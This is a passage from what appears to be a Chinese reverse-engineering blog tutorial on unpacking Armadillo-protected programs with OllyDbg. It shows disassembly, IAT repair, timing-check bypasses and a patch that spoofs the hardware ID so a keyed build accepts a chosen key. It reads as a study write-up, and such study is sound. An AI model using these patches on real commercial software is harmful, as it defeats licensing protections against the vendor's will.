class="number">90</span>                   <span class="keyword">nop</span></div><div class="line">0060FF2D      <span class="number">90</span>                   <span class="keyword">nop</span></div></pre></td></tr></table></figure></li><li><p>接着shift+F9,中断在006100F8处,就可以dump处子进程了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">006100EE   &gt; \C785 D8F5FFFF <span class="number">020001</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA28</span>],<span class="number">0x10002</span>     <span class="comment">;  UNICODE "::=::\"</span></div><div class="line">006100F8   &gt;  E9 D4100000          <span class="keyword">jmp</span> MAGCT.006111D1</div><div class="line">006100FD   &gt;  8B0D B0436400        <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x6443B0</span>]</div><div class="line"><span class="number">00610103</span>   .  81F1 050000C0        <span class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="number">0xC0000005</span></div><div class="line"><span class="number">00610109</span>   .  <span class="number">398D</span> D4F5FFFF        <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA2C</span>],<span class="built_in">ecx</span></div><div class="line">0061010F   .  0F85 <span class="number">92040000</span>        <span class="keyword">jnz</span> MAGCT.006105A7</div><div class="line"><span class="number">00610115</span>   .  <span class="number">70</span> <span class="number">07</span>                <span class="keyword">jo</span> XMAGCT.0061011E</div><div class="line"><span class="number">00610117</span>   .  7C <span class="number">03</span>                <span class="keyword">jl</span> XMAGCT.0061011C</div><div class="line"><span class="number">00610119</span>   &gt;  EB <span class="number">05</span>                <span class="keyword">jmp</span> XMAGCT<span class="meta">.00610120</span></div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就是还原IAT </p><ul><li>首先对DebugActiveProcess下断点<code>BP DebugActiveProcess</code>这样是为了寻找子进程，在堆栈窗口发现子进程ID为D84(不定)。接着重新打开一个OD，附加子进程，然后F9+F12，中断在入口点<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0012</span>BCBC   <span class="number">0060</span>F71A  /CALL 到 DebugActiveProcess 来自 MAGCT<span class="number">.0060</span>F714</div><div class="line"><span class="number">0012</span>BCC0   <span class="number">00000</span>DB4  \ProcessId = DB4</div></pre></td></tr></table></figure></li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">0061F743</span> &gt;/$- EB FE         jmp XMAGCT.&lt;ModuleEntryPoint&gt;</div><div class="line"><span class="number">0061F745</span>  |?  EC            <span class="keyword">in</span> al,dx</div><div class="line"><span class="number">0061F746</span>  |.  6A FF         <span class="built_in">push</span> -<span class="number">0x1</span></div><div class="line"><span class="number">0061F748</span>  |.  <span class="number">68</span> <span class="number">209B6400</span>   <span class="built_in">push</span> MAGCT.00649B20</div><div class="line"><span class="number">0061F74D</span>  |.  <span class="number">68</span> 80F46100   <span class="built_in">push</span> MAGCT.<span class="number">0061F480</span>                      ;  SE 处理程序安装</div><div class="line"><span class="number">0061F752</span>  |.  <span class="number">64</span>:A1 <span class="number">0000000</span>&gt;mov eax,dword ptr fs:[<span class="number">0</span>]</div><div class="line"><span class="number">0061F758</span>  |.  <span class="number">50</span>            <span class="built_in">push</span> eax</div></pre></td></tr></table></figure><ul><li><p>将死跳转字节<code>EB FE</code>正常指令字节<code>55 8B</code>,然后就可以执行我们上节讲的双变单了。在401000修改完双转单代码后，shift+F9跑起来，再次中断在OpenMutexA处。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">0061F743</span> &gt;    <span class="number">55</span>            <span class="built_in">push</span> ebp</div><div class="line"><span class="number">0061F744</span>      8BEC          mov ebp,esp</div><div class="line"><span class="number">0061F746</span>  |.  6A FF         <span class="built_in">push</span> -<span class="number">0x1</span></div><div class="line"><span class="number">0061F748</span>  |.  <span class="number">68</span> <span class="number">209B6400</span>   <span class="built_in">push</span> MAGCT.00649B20</div></pre></td></tr></table></figure></li><li><p>然后对GetModuleHandle下硬件断点。<code>HE GetModuleHandle</code>,经过VirtualAlloc和VirtualFree到达,然后返回，修改Magic_JMp.<strong>在此之前关闭硬件断点</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">001265</span>F4   <span class="number">00</span>F9ACC1  /CALL 到 GetModuleHandleA 来自 <span class="number">00</span>F9ACBB</div><div class="line"><span class="number">001265</span>F8   <span class="number">00126738</span>  \pModule = <span class="string">"kernel32.dll"</span></div></pre></td></tr></table></figure></li><li><p>初次以外还有一个时间校验，对GetTickCount下断，执行到返回</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">00E89116    FF15 AC22E900   <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[E922AC] <span class="comment">; kernel32.GetTickCount</span></div><div class="line">00E8911C    2B85 8CC3FFFF   <span class="keyword">sub</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-3C74]</div><div class="line">00E89122    8B8D 90C3FFFF   <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-3C70]</div><div class="line">00E89128    6BC9 <span class="number">32</span>         <span class="keyword">imul</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span>,<span class="number">32</span></div><div class="line">00E8912B    81C1 D0070000   <span class="keyword">add</span> <span class="built_in">ecx</span>,7D0</div><div class="line">00E89131    3BC1            <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="built_in">ecx</span></div><div class="line">00E89133    <span class="number">76</span> <span class="number">07</span>           <span class="keyword">jbe</span> short 00E8913C  //修改为：<span class="keyword">JMP</span> 00E8913C </div><div class="line">00E89135    C685 20C8FFFF <span class="number">0</span>&gt;<span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-37E0],<span class="number">1</span></div><div class="line">00E8913C    83BD D0C6FFFF <span class="number">0</span>&gt;<span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">3930</span>],<span class="number">0</span></div><div class="line">00E89143    0F85 8A000000   <span class="keyword">jnz</span> 00E891D3</div></pre></td></tr></table></figure></li><li><p>然后用ImportRCE修复即可！</p></li></ul><h2 id="0x4-带KEY的Armadillo"><a href="#0x4-带KEY的Armadillo" class="headerlink" title="0x4 带KEY的Armadillo"></a>0x4 带KEY的Armadillo</h2><h3 id="0x4-1-单进程"><a href="#0x4-1-单进程" class="headerlink" title="0x4.1 单进程"></a>0x4.1 单进程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;带KEY的Armadillo相当于给软件多了一层保护，我们此时还不能通过爆破的方式解决这个KEY，原因有2，第一，OD对于这类情况不提供修改的选项，第二，就算爆破成功了，后期软件中还存在暗桩。所以可以逆向算法的方式得到一组合适的KEY。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先shitf+F9运行起来，不要管出现的对话框，首先随便输入个Key，然后下<code>HE GetDlgItem</code>断点即可。取消断点，ALT+F9执行返回。大概停在此处。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="number">021B44FC</span>    85C0            test eax,eax</div><div class="line"><span class="number">021B44FE</span>    <span class="number">74</span> <span class="number">33</span>           je X021B4533</div><div class="line"><span class="number">021B4500</span>    BB <span class="number">00010000</span>     mov ebx,<span class="number">0x100</span></div><div class="line"><span class="number">021B4505</span>    8D85 <span class="number">00FFFFFF</span>   lea eax,dword ptr ss:[ebp-<span class="number">0x100</span>]</div><div class="line"><span class="number">021B450B</span>    <span class="number">53</span>              <span class="built_in">push</span> ebx</div><div class="line"><span class="number">021B450C</span>    <span class="number">50</span>              <span class="built_in">push</span> eax</div><div class="line"><span class="number">021B450D</span>    <span class="number">57</span>              <span class="built_in">push</span> edi</div><div class="line"><span class="number">021B450E</span>    FF75 <span class="number">08</span>         <span class="built_in">push</span> dword ptr ss:[ebp+<span class="number">0x8</span>]</div><div class="line"><span class="number">021B4511</span>    FFD6            call esi</div><div class="line"><span class="number">021B4513</span>    8B3D E0641C02   mov edi,dword ptr ds:[<span class="number">0x21C64E0</span>]         ; USER32.GetWindowTextA</div><div class="line"><span class="number">021B4519</span>    <span class="number">50</span>              <span class="built_in">push</span> eax</div><div class="line"><span class="number">021B451A</span>    FFD7            call edi</div><div class="line"><span class="number">021B451C</span>    8D85 <span class="number">00FEFFFF</span>   lea eax,dword ptr ss:[ebp-<span class="number">0x200</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后向上找，找到这个函数开始地方，也就是上一个ret的下个指令.然后下硬件执行断点。然后重新载入，shitf+F9<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="number">021B4462</span>    <span class="number">40</span>              inc eax</div><div class="line"><span class="number">021B4463</span>    C3              retn</div><div class="line"><span class="number">021B4464</span>    <span class="number">55</span>              <span class="built_in">push</span> ebp</div><div class="line"><span class="number">021B4465</span>    8BEC            mov ebp,esp</div><div class="line"><span class="number">021B4467</span>    81EC <span class="number">00040000</span>   sub esp,<span class="number">0x400</span></div><div class="line"><span class="number">021B446D</span>    <span class="number">8B45</span> <span class="number">0C</span>         mov eax,dword ptr ss:[ebp+<span class="number">0xC</span>]</div><div class="line"><span class="number">021B4470</span>    <span class="number">53</span>              <span class="built_in">push</span> ebx</div><div class="line"><span class="number">021B4471</span>    <span class="number">56</span>              <span class="built_in">push</span> esi</div><div class="line"><span class="number">021B4472</span>    2D <span class="number">10010000</span>     sub eax,<span class="number">0x110</span></div><div class="line"><span class="number">021B4477</span>    <span class="number">57</span>              <span class="built_in">push</span> edi</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时中断在之前下的执行断点处。单步走到021B4478处的第一个大跳转<code>je 021B45F2</code>右键跟随。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">021B4464</span>    <span class="number">55</span>              <span class="built_in">push</span> ebp</div><div class="line"><span class="number">021B4465</span>    8BEC            mov ebp,esp</div><div class="line"><span class="number">021B4467</span>    81EC <span class="number">00040000</span>   sub esp,<span class="number">0x400</span></div><div class="line"><span class="number">021B446D</span>    <span class="number">8B45</span> <span class="number">0C</span>         mov eax,dword ptr ss:[ebp+<span class="number">0xC</span>]</div><div class="line"><span class="number">021B4470</span>    <span class="number">53</span>              <span class="built_in">push</span> ebx</div><div class="line"><span class="number">021B4471</span>    <span class="number">56</span>              <span class="built_in">push</span> esi</div><div class="line"><span class="number">021B4472</span>    2D <span class="number">10010000</span>     sub eax,<span class="number">0x110</span></div><div class="line"><span class="number">021B4477</span>    <span class="number">57</span>              <span class="built_in">push</span> edi</div><div class="line"><span class="number">021B4478</span>    <span class="number">0F84</span> <span class="number">74010000</span>   je <span class="number">021B45F2</span></div><div class="line"><span class="number">021B447E</span>    <span class="number">48</span>              dec eax</div><div class="line"><span class="number">021B447F</span>    <span class="number">74</span> <span class="number">07</span>           je X021B4488</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;跟随到021B45F2处，F2下断点，执行到此处，继续单步跟。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="number">021B45F2</span>    F645 <span class="number">17</span> <span class="number">80</span>      test byte ptr ss:[ebp+<span class="number">0x17</span>],<span class="number">0x80</span></div><div class="line"><span class="number">021B45F6</span>    8B7D <span class="number">08</span>         mov edi,dword ptr ss:[ebp+<span class="number">0x8</span>]</div><div class="line"><span class="number">021B45F9</span>    <span class="number">74</span> <span class="number">12</span>           je X021B460D</div><div class="line"><span class="number">021B45FB</span>    <span class="number">8065</span> <span class="number">17</span> 7F      <span class="keyword">and</span> byte ptr ss:[ebp+<span class="number">0x17</span>],<span class="number">0x7F</span></div><div class="line"><span class="number">021B45FF</span>    6A <span class="number">01</span>           <span class="built_in">push</span> <span class="number">0x1</span></div><div class="line"><span class="number">021B4601</span>    <span class="number">68</span> 5CC91C02     <span class="built_in">push</span> <span class="number">0x21CC95C</span></div><div class="line"><span class="number">021B4606</span>    <span class="number">57</span>              <span class="built_in">push</span> edi</div><div class="line"><span class="number">021B4607</span>    FF15 C0641C02   call dword ptr ds:[<span class="number">0x21C64C0</span>]        ; USER32.SetPropA</div><div class="line"><span class="number">021B460D</span>    <span class="number">8B35</span> E8641C02   mov esi,dword ptr ds:[<span class="number">0x21C64E8</span>]         ; USER32.GetDlgItem</div><div class="line"><span class="number">021B4613</span>    6A <span class="number">01</span>           <span class="built_in">push</span> <span class="number">0x1</span></div><div class="line"><span class="number">021B4615</span>    <span class="number">57</span>              <span class="built_in">push</span> edi</div><div class="line"><span class="number">021B4616</span>    FFD6            call esi</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一直到021B4689处<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">021B467D</span>   /<span class="number">0F84</span> B7000000   je <span class="number">021B473A</span></div><div class="line"><span class="number">021B4683</span>   |<span class="number">53</span>              <span class="built_in">push</span> ebx</div><div class="line"><span class="number">021B4684</span>   |B9 98FA1C02     mov ecx,<span class="number">0x21CFA98</span></div><div class="line"><span class="number">021B4689</span>   |E8 253CFEFF     call <span class="number">021982B3</span>                            ; 跟入</div><div class="line"><span class="number">021B468E</span>   |<span class="number">53</span>              <span class="built_in">push</span> ebx</div><div class="line"><span class="number">021B468F</span>   |B9 98FA1C02     mov ecx,<span class="number">0x21CFA98</span></div><div class="line"><span class="number">021B4694</span>   |<span class="number">8945</span> <span class="number">08</span>         mov dword ptr ss:[ebp+<span class="number">0x8</span>],eax</div><div class="line"><span class="number">021B4697</span>   |E8 353CFEFF     call <span class="number">021982D1</span></div><div class="line"><span class="number">021B469C</span>   |837D <span class="number">14</span> <span class="number">01</span>      cmp dword ptr ss:[ebp+<span class="number">0x14</span>],<span class="number">0x1</span></div><div class="line"><span class="number">021B46A0</span>   |<span class="number">75</span> <span class="number">27</span>           jnz X021B46C9</div><div class="line"><span class="number">021B46A2</span>   |<span class="number">8B45</span> <span class="number">08</span>         mov eax,dword ptr ss:[ebp+<span class="number">0x8</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在021982C2步入，执行到021A59FA处可以发现EAX就是硬件号<code>3C6663B2</code>。接着在一个可以执行的代码段打补丁<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="number">021982B3</span>    <span class="number">56</span>              <span class="built_in">push</span> esi</div><div class="line"><span class="number">021982B4</span>    8BF1            mov esi,ecx</div><div class="line"><span class="number">021982B6</span>    FF7424 <span class="number">08</span>       <span class="built_in">push</span> dword ptr ss:[esp+<span class="number">0x8</span>]</div><div class="line"><span class="number">021982BA</span>    8B8E 5C060000   mov ecx,dword ptr ds:[esi+<span class="number">0x65C</span>]</div><div class="line"><span class="number">021982C0</span>    6A <span class="number">00</span>           <span class="built_in">push</span> <span class="number">0x0</span></div><div class="line"><span class="number">021982C2</span>    E8 24D70000     call <span class="number">021A59EB</span>                    ;步入</div><div class="line"><span class="number">021982C7</span>    <span class="number">3386</span> 5C200000   xor eax,dword ptr ds:[esi+<span class="number">0x205C</span>]</div><div class="line"><span class="number">021982CD</span>    5E              <span class="built_in">pop</span> esi</div><div class="line">//</div><div class="line"><span class="number">021A59EB</span>    <span class="number">8B4424</span> <span class="number">04</span>       mov eax,dword ptr ss:[esp+<span class="number">0x4</span>]</div><div class="line"><span class="number">021A59EF</span>    C1E0 <span class="number">06</span>         shl eax,<span class="number">0x6</span></div><div class="line"><span class="number">021A59F2</span>    <span class="number">034424</span> <span class="number">08</span>       add eax,dword ptr ss:[esp+<span class="number">0x8</span>]</div><div class="line"><span class="number">021A59F6</span>    <span class="number">8B4481</span> <span class="number">18</span>       mov eax,dword ptr ds:[ecx+eax*<span class="number">4</span>+<span class="number">0x18</span>]</div><div class="line"><span class="number">021A59FA</span>    <span class="number">35</span> 8AC0E665     xor eax,<span class="number">0x65E6C08A</span></div><div class="line">//</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ctrl+g，输入00401000然后输入如下内容<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">xor</span>     <span class="built_in">eax</span>, 65E6C08A  </div><div class="line"><span class="keyword">cmp</span>     <span class="built_in">eax</span>, 5980A338   <span class="comment">; 判断 EAX 是否是我的机器码( )</span></div><div class="line"><span class="keyword">jnz</span>     <span class="number">00401011</span>         <span class="comment">;不是则返回</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, 5F48DD41    <span class="comment">;如果是,则修改为5F48DD41</span></div><div class="line"><span class="keyword">retn</span>    <span class="number">8</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打好补丁后，在401000处F2下下断点，然后返回，剩下的使用上面讲的方法就可以脱去。</p><h3 id="0x4-1-双进程"><a href="#0x4-1-双进程" class="headerlink" title="0x4.1 双进程"></a>0x4.1 双进程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;得鸽一下。</p><h2 id="0x5-DLL脱壳"><a href="#0x5-DLL脱壳" class="headerlink" title="0x5 DLL脱壳"></a>0x5 DLL脱壳</h2><h3 id="0x5-1-DLL脱壳"><a href="#0x5-1-DLL脱壳" class="headerlink" title="0x5.1 DLL脱壳"></a>0x5.1 DLL脱壳</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改Magic_Jmp绕过IAT加密。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">02995E53    395F FC         <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>-<span class="number">0x4</span>],<span class="built_in">ebx</span></div><div class="line">02995E56  ^ 0F85 49FEFFFF   <span class="keyword">jnz</span> 02995CA5</div><div class="line">02995E5C    EB <span class="number">03</span>           <span class="keyword">jmp</span> X02995E61</div><div class="line">02995E5E    D6              <span class="keyword">salc</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就是和exe脱壳不一样的地方，处理重定位表。<strong>大佬这边的操作有点不明白，哪位师傅如果知道告知一下。</strong>首先对GetTickCount下硬件断点<code>HE GetTickCount</code>,然后shitf+f9，观察堆栈是这个结果的话，删除断点，并返回.程序停在029AC3C8处。<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">00129220 </span>  <span class="number">029</span>AC3C8  /<span class="keyword">CALL</span> 到 GetTickCount 来自 <span class="number">029</span>AC3C2</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">029AC3C8    2B85 A4D4FFFF   <span class="keyword">sub</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2B5C</span>]</div><div class="line">029AC3CE    8B8D A8D4FFFF   <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2B58</span>]</div><div class="line">029AC3D4    6BC9 <span class="number">32</span>         <span class="keyword">imul</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span>,<span class="number">0x32</span></div><div class="line">029AC3D7    81C1 D0070000   <span class="keyword">add</span> <span class="built_in">ecx</span>,<span class="number">0x7D0</span></div><div class="line">029AC3DD    3BC1            <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="built_in">ecx</span></div><div class="line">029AC3DF    <span class="number">76</span> <span class="number">07</span>           <span class="keyword">jbe</span> X029AC3E8</div><div class="line">029AC3E1    C685 34D9FFFF <span class="number">0</span>&gt;<span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x26CC</span>],<span class="number">0x1</span></div><div class="line">029AC3E8    83BD E4D7FFFF <span class="number">0</span>&gt;<span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x281C</span>],<span class="number">0x0</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后ctrl+s，搜索,之后在找到的地址下断运行。就会出现如下黄色字体，记住标记的重定位RVA=6000和size=3B0.并将029ACFB8处跳转改为<strong>绝对跳转</strong>。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUSH</span> <span class="built_in">EAX</span></div><div class="line"><span class="keyword">XCHG</span> <span class="built_in">CX</span>,<span class="built_in">CX</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">EAX</span></div><div class="line"><span class="keyword">STC</span></div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">029ACF59    C705 E0C09B02 <span class="number">6</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29BC0E0</span>],<span class="number">0x29BCB60</span>   <span class="comment">; 重定位表RVA为6000</span></div><div class="line">029ACF63    A1 E49F9C02     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>]</div><div class="line">029ACF68    8B00            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]</div><div class="line">029ACF6A    <span class="number">8985</span> 3CD9FFFF   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x26C4</span>],<span class="built_in">eax</span></div><div class="line">029ACF70    A1 E49F9C02     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>]</div><div class="line">029ACF75    83C0 <span class="number">04</span>         <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0x4</span></div><div class="line">029ACF78    A3 E49F9C02     <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>],<span class="built_in">eax</span></div><div class="line">029ACF7D    A1 E49F9C02     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>]</div><div class="line">029ACF82    8B00            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]               <span class="comment">; 重定位表的大小为03B0</span></div><div class="line">029ACF84    <span class="number">8985</span> 78D9FFFF   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2688</span>],<span class="built_in">eax</span></div><div class="line">029ACF8A    A1 E49F9C02     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>]</div><div class="line">029ACF8F    83C0 <span class="number">04</span>         <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0x4</span></div><div class="line">029ACF92    A3 E49F9C02     <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C9FE4</span>],<span class="built_in">eax</span></div><div class="line">029ACF97    83BD 3CD9FFFF <span class="number">0</span>&gt;<span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x26C4</span>],<span class="number">0x0</span>        <span class="comment">; 重定位表为0？？</span></div><div class="line">029ACF9E    <span class="number">74</span> 6F           <span class="keyword">je</span> X029AD00F</div><div class="line">029ACFA0    83BD 78D9FFFF <span class="number">0</span>&gt;<span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2688</span>],<span class="number">0x0</span></div><div class="line">029ACFA7    <span class="number">74</span> <span class="number">66</span>           <span class="keyword">je</span> X029AD00F</div><div class="line">029ACFA9    8B85 FCD7FFFF   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2804</span>]</div><div class="line">029ACFAF    8B8D 0CD8FFFF   <span 